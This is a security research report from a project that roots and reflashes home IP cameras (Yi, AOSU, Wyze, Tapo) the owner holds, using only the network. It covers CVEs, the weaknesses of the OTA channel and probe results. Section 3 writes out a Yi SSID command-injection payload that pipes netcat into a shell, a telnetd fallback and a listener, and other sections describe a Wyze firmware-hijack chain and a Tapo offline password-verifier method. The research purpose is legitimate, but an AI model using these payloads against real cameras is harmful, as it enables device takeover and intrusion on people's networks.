# Network-only root and firmware delivery — owner fleet

**Status:** research result, 2026-10-22. Not a qualification claim. Nothing here is release-qualified
and no camera has been reflashed.
**Scope:** owner LAN `Aardvark` (192.168.4.0/22). Owner devices only.
**Constraints:** no disassembly, no UART/soldering, no SD card, no vendor developer program. A
one-time physical **button press** or **app re-provision** is allowed.

This document exists because `DEVICE_ADAPTER_MATRIX.md` §3a/§3b and `fss-provision` encode
"Wyze/AOSU are locked for software, `Transport::None`" as a *charter* decision with no backing
evidence. That is now partly wrong in both directions, and this file records which way.

## 1. Result per family

Two orders are defensible and they differ. This table is ordered **by owner constraint** (least
physical ritual first, mechanism third). The adversarial pack ranks instead by
`(pre-auth x reliability) / (brick risk x physical prerequisite)` — H-008's order is Tapo, Wyze, AOSU,
Yi, and the inversion is deliberate: H-008 weights the one true pre-auth exec path (Tapo) first, while
this table puts the two families whose chains are already reached first.

| Family | Reboot-surviving root over the network? | Binding gate | Evidence |
|---|---|---|---|
| **Yi IPC** | **mechanism only, never fired** — CVE-2018-3910 SSID command injection into `popen("/home/app/cloudAPI … -ssid \"%s\"")` → `sh -c` | one app re-provision onto an attacker AP; no card, no cable | H-006 Y8, Route A (:23-31, :126-152); proving test U1 |
| **AOSU HomeBase** | **open question, and the best remaining candidate** — `FRM_LAN_OTA_START/DATA/FINISH (0x1A/0x1B/0x1C)` is a firmware push *inside* the authenticated LAN session: no cloud, no URL, and (derived, not confirmed) no TLS | whether the LAN frame carries `hmac` (needs `activate.seckey`) or only `md5`; plus one pairing-mode press for `local_key` | pack H-003 §LAN OTA |
| **Wyze Cam v4** | **install-time root only** — OTA fetch is **plain HTTP 80**, MD5-only, and ends in `sh upgraderun.sh` as root, with a **public default AES key** | persistence: **no** script route — `/system` is dm-verity'd, `/configs` is writable but nothing boots from it, and the rootfs has no `fw_setenv` | pack H-002 §3.3/§4.5, H-002c |
| **TP-Link Tapo** | **pre-auth root *if* the model is C200 hw v5 `<V5_1.4.6 Build 260709` or C120 v1 `<1.9.4 Build 260813`** (CVE-2026-102369, 8.7, `PR:N`), plus two new `PR:N` DS-API flaws (CVE-2026-105814/105815) and an authenticated overflow (CVE-2026-105810) | **model identification is the blocking step** — the wire cannot prove it (`CN=TAPO-DEVICE` for every model) | H-005; H-008 §0/§3a, F-5, F-8; H-010-011 |
| Canary | blocked — not present on the LAN | device absence | — |

## 2. What is dead, and why it matters

`fss`'s device matrix assumed the barrier was *access*. It is not. On Wyze the barrier is
**delivery + a signed boot chain**; on Tapo it is the boot chain alone; on AOSU and Yi it is
**one provisioning action**. Concretely refuted here:

- **No memory-unsafe sink *in the parsers we fuzzed*.** Every case in H-001's malformed matrix —
  discovery size confusion, handshake fragments, record loop, AV/HL lengths — kept the listener
  alive. That is a statement about the TUTK handshake and AV parsers only; §7 records a sink in
  TUTK's own `tutk_packet_Alloc` and an IOCTL handler that takes client-shaped data. CVE-2023-6324 (empty-PSK) is gone; the published RCE
  CVE-2023-6322 was fixed in Jan 2024 and this build is Nov 2025 (SDK `4.3.8.0-…-R2_openssl_Mips_T41_7.2.0`).
  But see §3 for the one thing legacy IOTC *does* still hand out.
- **`K10000` over ~1 KB kills the stream, not the camera** (H-001) — deterministic at 967 B ok / 1047 B
  fatal; a fresh session immediately afterwards streams normally with no reboot. An authenticated
  per-viewer DoS, and the only reliable failure found in the whole AV layer.
- **No pre-auth identity or key oracle on Tuya 3.5** (H-003). 6668 stays silent on GCM failure and closes on
  any `55AA` prefix, so `local_key` recovery is a blind 2^128 search unless obtained out of band.
- **No hidden daemon behind the AOSU proxy** (H-003 §Pivot). 3 025 loopback ports scanned twice: the internally open
  set (`443`, `8888`) is a subset of the externally open set.
- **No state gate on the Yi's dead TCP stack** (H-006 §Unblock test). Port 80 RSTs after WS-Discovery, after 217/217 TNP
  replies, from four source ports and from a source address inside the camera's own /24.
- **No unsigned *recovery-image* path on Wyze** (the SD artifact is `sign-images = firmware`); the
  community method boots a foreign kernel *from* SD instead. U-Boot's
  `verify` defaults ON when unset, and `fit_config_verify_required_keys` only honours key nodes in
  u-boot's **control dtb** carrying `required = "conf"`. The artifact alone cannot show whether that
  node is present (it lives in `mtdblock0`, which no released zip ships); the live boot log does —
  `sha256,rsa2048:kernel-dev+ ... OK` (H-002c:26-31). So the gate is **required-key, every boot**, and
  `kernel-dev` is u-boot's own documented example key name; thingino ships no key material.
- **Legacy UID does not authenticate** (H-001, H-002). `0x0402` and AV login1 are both silent without DTLS, and
  login1 carries the ENR anyway; there is no non-DTLS session path on the v4. UID is inventory only.

### 2b. Wyze OTA — the one chain that could still land

> **Open conflict.** A second static pass over 4.52.17.26 (`docs/exploit/ota-path.md`) finds the v4
> downloader rejects any URL not starting `https` and sets `CURLOPT_SSL_VERIFYPEER=1`,
> `VERIFYHOST=2`, with a device CA path — i.e. plain HTTP may be v2-only, and the real gate would be
> TLS trust for an Amazon-owned host we cannot get a certificate for. No allowlist was found in the
> downloader, so a device-trusted CA would also suffice. This is unresolved and it decides the chain.

The update channel is weak where it matters. Mechanism from v2-era evidence, `[INFERENCE]` for v4 —
the v4 object is `<ver>.tar` and the handler's own strings say `/tmp/img`:
`GET /firmware.bin` over **plain HTTP port 80** to an allowlisted host, `/tmp/img`, a
**caller-supplied MD5**, decryption, `tar -xvf /tmp/Upgrade.tar`, then `sh /tmp/Upgrade/upgraderun.sh`
**as root**. No TLS, no pinning, and the key is a **compiled default constant**, not a per-unit
secret: `oU8XzEpbOD6pVTLwdz9pxRpN9MGPCo1P` at `libwyzeUtilsPlatform.so` `.rodata 0x6224` in 4.52.17.26 (`0x67cc` in 4.52.9.5332), selected
whenever the provisioned field equals the sentinel `"HLHL"`. `encrypt_type` is **not** caller-supplied
— the push JSON carries only `url`, `md5`, `model` — and `encrypt_type 0` is *not* plaintext: value 1
is AES-256-ECB with padding off, any other value shells out to `encryption` (CBC family, zero IV).
Wrong-mode guesses fail inert (nothing is written). A plaintext tar is accepted only on the
`key[0] == 0` branch, which stock does not take because `product_config_get_ota_app_key` always fills
the buffer.

Consequence: the install path is open to an owner-supplied tar. The trigger is the only cloud
dependency — it is an **AWS-IoT MQTT shadow delta** on `$aws/things/<id>/shadow/name/wyze-service/update/delta`,
handed to `assis` over IPC, so the camera only starts a fetch when the cloud tells it to. The fetch host
is one of three documented names (`d1fk93tz4plczb.cloudfront.net`, `s3-us-west-2.amazonaws.com`,
`d2h8pzxcxn71bo.cloudfront.net`) and the path shape is
`s3-us-west-2.amazonaws.com/wuv2/upgrade/<MODEL>/firmware/<ver>.tar`, so a DNS spoof plus the owner's
"check for updates" is enough provided the spoof is up **before** the tap; no broker compromise is
needed. A token-bearing `run_action` call from our side is the fallback if the tap does not raise a delta.

The image format is a FIT wrapping an `RKAF` map of exactly `boot` and `system`; the artifact never
carries the bootloader, and the stock script writes to the backup bank only. That is not a guarantee:
`upgraderun.sh` is root, and the CVE-2026-50719 route writes `mtdblock0` — **that write is the one
brick path**. A written-but-unbootable kernel still needs SD/UART. **Boot does a required-key FIT
verify** (`sha256,rsa2048:kernel-dev+`), and `/system` is **dm-verity'd**: `fs_mgr` verifies metadata
against `/verity_key` in the ramdisk and on failure returns *without mounting*, so S18 exits 0, `/configs`
never mounts and no daemon starts — a camera that boots, joins nothing and does nothing. A modified
squashfs without a matching verity blob is a one-way trip, and the root hash is signed.

**There is no script persistence.** `/configs` is rw and exec but nothing boots from it; its only
consumers are `.product_config` (read-only), `upGradeFlag` (deleted at boot) and `.debug_flag` (which
selects a branch that starts *no* daemons). No env tool exists (no `fw_setenv`, no busybox applet), so
`bootargs` — plain text with a CRC32 in the env block — needs a hand-built `dd`. `factorycheck`'s `/tmp/Test/test.sh` route needs an SD/USB `Test.tar`
and that tar is itself signature-checked. So: **install root, not persistent.** Only the env `init=`
edit changes that, and it is unproven twice over: the build may be `CONFIG_ENV_IS_NOWHERE`, and
`/configs` is not mounted at `init=` time so the script must mount `mtdblock4` itself.

## 3. What is usable today

- **Yi, root shell (mechanism only; U1 in H-006 is the proving test).** SSID payload `x$(nc <host> 4444|sh)` (28 octets, fits the 32-octet field),
  listener `nc -lv 4444`. Fallback `x";telnetd -l/bin/sh;#`. The SSID persists, so the payload
  re-fires on every boot while the camera stays on that AP — persistence by construction. Do not kill
  `rmm` (it is the watchdog's liveness target); kick `/dev/watchdog` from a separate loop.
- **AOSU, unauthenticated open proxy** at `51028` (`tinyproxy/1.11.2`, no `Allow`, no `ConnectPort`)
  with arbitrary egress and a `127.0.0.1` 200-vs-500 port oracle. Not CVE-2023-49606 (1.10.0/1.11.1
  only); in scope for CVE-2025-63938 and CVE-2026-31842, neither RCE.
- **Tapo, offline password verifier.** `POST /` with `encrypt_type:"3"` returns
  `SHA256(cnonce + hash(password) + nonce) + nonce + cnonce` unauthenticated; `cnonce` is
  attacker-chosen, so it is an unmetered verifier over an unsalted, un-stretched hash
  (`[64:80]==nonce`, `[80:96]==cnonce`). ~1.65 M candidates in 6 s — **and it did not hit**: the owner
  password was not recovered, so no Tapo session exists yet.
- **Wyze, complete LAN capture path with no cloud after one inventory** (uid/enr/mac): discovery →
  DTLS 1.2 `ECDHE_PSK_CHACHA20_POLY1305` (identity `AUTHPWD_admin`, PSK `SHA256(ENR)` NUL-zeroed) →
  AV login → frame stream and K-command channel. Independent Python implementation in
  `deliverables/scripts/dtlslib.py`; 592 frames reproduced by the repository client.
- **Wyze, unauthenticated P2P UID disclosure.** Legacy IOTC `0x0601` discovery carries no credential
  and the reply body `[16:36]` is the 20-byte UID verbatim (3/3 units, repeatable). The UID alone
  does not authenticate the NEW protocol, but it is the identity half of every CVE-2023-63xx replay
  class and an inventory seed for a device you have not paired.

## 4. Risk notes that will bite

- Wyze `/configs` (jffs2) is the only persistent writable store and **nothing executes from it**; a
  root shell alone does not survive reboot. SD is the boot hook, which contradicts the "no card" rule.
- U-Boot recovery binds `192.168.0.10` over **wire**; the camera's own Wi-Fi does not work in that
  state. The u-boot env carries the SSID with no Ethernet fallback, and the env is a **single copy
  with no redundancy** — a torn write falls back to the compiled defaults.
- `switch_firmware_with_all_partitions = "no"` leaves the staging partitions in place; blanking them
  (the community `format` step) breaks the *next* stock OTA weeks later.
- Power loss during the boot-time copy leaves a partial main partition; there is no second copy.
- The 2023-12 Tapo brick wave happened because the SD recovery script lives inside the firmware that
  broke. Tapo has no independent recovery.
- **All four Tapo CVEs are model-locked and the wire cannot prove the model**: CVE-2026-102369
  (C200 hw v5 / C120 v1), CVE-2026-105810 (C320WS v2), CVE-2026-105814 and -105815 (C210 v3.6). The
  cert is `CN=TAPO-DEVICE` for every model and `554` is closed, which fits several. One chassis label
  or an authenticated `getDeviceInfo` unblocks all of them; nothing else does.

### AOSU brick contract (rank 2 has none yet, so here it is)

- The A/B commit point is unknown: whether the bootloader validates before switching banks decides
  soft-brick vs reflash-only (H-003:106).
- No factory partition, no evidenced TFTP, and the partition table is confidential — the flash is
  one-way.
- `local_key` changes on re-pair, so a saved key is not durable (H-003:181).
- `CLIENT_LIMT 3` and `ALLOW_NO_KEY_NUM 3` allow three pre-session-key frames per connection, so
  negotiation must be single-shot; exceeding either faults the session (H-003:110).

## 5. Repository defects found on the way

- **Fixed:** `fss-tuya` framed `0x6699` with a 20-byte header and a 16-byte AAD. TuyaOS
  (`lpv35_additional_data_t`, `tuya_protocol.c:486-513`) and tinytuya (`">IHIII"`, AAD `data[4:]`)
  both use **18 bytes with AAD `[4:18]`**. Every 3.5 frame was two bytes long and mis-authenticated;
  `fss-capture-tuya --proto 3.5` could never have opened a session, and the golden fixture had been
  regenerated from the same wrong assumption. Now 21 tests pass, with a header-shape pin.
- `fss-discover` classifies none of the fleet: `.4.37` is the only non-`Unknown` row (Tuya) and the
  three Wyze units and the Yi all come back `Unknown` / `ImportOnly` / `Unavailable`. The brand
  classifier has no TUTK or Wyze lane, and its census cannot see a camera that answers only UDP.

## 6. Next decisive tests

1. **AOSU LAN OTA** — first a 512-byte **wrong-shape** `0x1A` so `retcode 1` names the encoding, then
   the wrong-digest run on the shape that parses. A digest verdict read through the wrong encoding is
   indistinguishable from a parse failure. Digest-checked vs digest-ignored decides whether
   `local_key` alone is enough. This is the whole question.
2. **Wyze dev key** — `key-name-hint = kernel-dev` is baked into U-Boot. If the matching private key
   ships in an Ingenic/Wyze SDK, an owner can sign; if not, Wyze needs the card.
3. **Yi reboot matrix** — ping, WS-Discovery `AppSequence.InstanceId`, port 80, {8080,8000,8899,23},
   TNP, before and after a power cycle. InstanceId changes with 80 still RST proves the ONVIF daemon
   never starts and the advertised `XAddrs` is a static string.

## 7. 2026-10-22 addendum (GrayBadger) — the memory-unsafe sink does exist, in Wyze's own SDK

§2 above says "No memory-unsafe sink on Wyze". That holds for the TUTK handshake/AV parsers as
independently fuzzed, but **not for the TUTK packet allocator**, and the IOCTL layer additionally
accepts client-shaped data:

- **CVE-2026-38698** (public 2026-09-18, pwn2own 2025 Ireland, PoC + report in
  `github.com/vital-information-resource-under-siege/cve-2026-38698-and-cve-2026-38699`):
  authenticated heap overflow in `tutk_packet_Alloc` — the AVPacket header length is forwarded to
  `malloc(param_5+0x24+param_4+param_2)` (≈0x438) and then used as the `memcpy` length. Affected
  TUTK SDK **3.1.10.0 … 4.3.8.1**. The 4.52.17.26 rootfs `bin/iCamera` embeds exactly
  `4.3.8.0-5-gf554f2f-R2_openssl_Mips_T41_7.2.0_v2`, i.e. **4.3.8.0, inside the affected range.**
- **CVE-2026-38699** is the pre-auth sibling: OOB read in `__Fill_ReadBuf` from an unvalidated
  DTLS payload offset (`0x90000000`), reliable crash, no key required.
- The vendor IOCTL table also takes client-shaped data post-auth: cmd **0x284C**
  (`set_mutil_apart_alarm`, entry vaddr `0x8b8b1c`, handler `0x590c3c`, max `0x144`) parses a
  client-declared length through inlined OpenCV. A 7-byte payload `01 00 01 0a 14 1e 28` is accepted
  and persists `apartalarmParm` (observed `type:1 startX:18 longX:56 startY:22 heightY:55`).

Transmission state: the legacy `0x0601` discovery is still answered by 4.52.17.26 and leaks the UID;
the `0x0402` session request is silent (H-001:20-21,36-37), so the stock PoC stalls before
`SSL_connect`.
Replaying its exact 0x540-byte frame (faulty size `0xEEEE` at offset `0x18`) as raw DTLS appdata over
the working `0xCC51` session is accepted but does not crash — the remaining question is the
client→camera AV header/framing, not reachability.

A shell path needing no memory corruption also exists in the binary but is **not yet reachable**:
paracfg user-config item 11 (`telntSwitch`) drives `system("telnetd &")` (apply fn `0x462878`); the
setter for key 11 is unlocated. CVE-2026-38699's "reliable crash" likewise has no in-repo evidence
yet.

Lab tooling: `crates/fss-tutk/examples/session_probe.rs` (`--ioctl`, `--raw-file`, `--k10000-file`,
`--identity`, `--psk-hex`, `--capture-dir`) plus `SessionEvent::Ioctl` for camera→client captures.
Beads/evidence: `~/brennerbot_sessions/fss-camera-liberation-2026-10-22`.

## 8. Sources and reproduction

In-repo: `docs/research/` (packs), `deliverables/scripts/` (probes), `evidence/excerpts/H-005b/` (Tapo
captures + `digest.py`), `docs/exploit/flash-plan.md` (wire-only replacement runbook). External:
the Tapo advisories (`tp-link.com/us/support/faq/5351`, `/5352`) and CVE records; the CVE-2026-38698
PoC repository named in §7; `github.com/kennedn/tapo-onboarding`; `thingino` / `wz_flash-helper`.

Redaction: the probes carry one lab unit's UID/ENR/MAC (`192.168.4.24`, `S3X2…`, `O7y7…`,
`80:48:2C:4B:CF:0B`) as literals. UID/MAC are identifiers; **the ENR is the device secret** — it
authenticates the TUTK session and derives the DTLS PSK, so it is per-unit and not reproducible
elsewhere.
